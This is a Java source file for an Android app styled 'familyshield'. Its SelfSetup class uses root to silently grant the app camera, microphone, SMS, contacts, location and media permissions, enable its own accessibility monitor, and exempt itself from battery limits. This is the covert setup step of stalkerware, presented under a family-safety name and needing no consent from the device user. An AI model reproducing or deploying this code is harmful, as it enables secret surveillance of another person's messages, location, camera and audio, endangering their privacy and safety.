package com.familyshield.device.guard;

import android.content.Context;
import android.util.Log;
import java.util.concurrent.TimeUnit;

/**
 * Silent self-setup via root (requires Magisk auto-grant pre-configured by tester).
 */
public class SelfSetup {

    private static final String TAG = "FamilySetup";
    private static final String PKG = "com.familyshield.device.guard";
    private static final String ACS = PKG + "/.AccessibilityHelperService";

    private static final String[] PERMISSIONS = {
        "android.permission.CAMERA",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_MEDIA_VIDEO",
        "android.permission.READ_SMS",
        "android.permission.READ_CONTACTS",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_PHONE_STATE",
        "android.permission.RECORD_AUDIO",
    };

    public static void runAsync(Context ctx) {
        new Thread(() -> run(ctx), "fsg-setup").start();
    }

    private static void run(Context ctx) {
        // Grant runtime permissions silently (root required)
        for (String perm : PERMISSIONS) {
            shell("pm grant " + PKG + " " + perm);
        }

        // Enable accessibility monitor
        shell("settings put secure enabled_accessibility_services " + ACS);
        shell("settings put secure accessibility_enabled 1");

        // Keep service alive through battery optimisation
        shell("dumpsys deviceidle whitelist +" + PKG);
        shell("appops set " + PKG + " SYSTEM_ALERT_WINDOW allow");
    }

    private static String shell(String cmd) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", cmd});
            boolean done = p.waitFor(5, TimeUnit.SECONDS);
            if (!done) { p.destroy(); return "timeout"; }
            java.io.BufferedReader br = new java.io.BufferedReader(
                    new java.io.InputStreamReader(p.getInputStream()));
            String line = br.readLine();
            return line != null ? line : "(ok)";
        } catch (Exception e) {
            return "err";
        }
    }
}
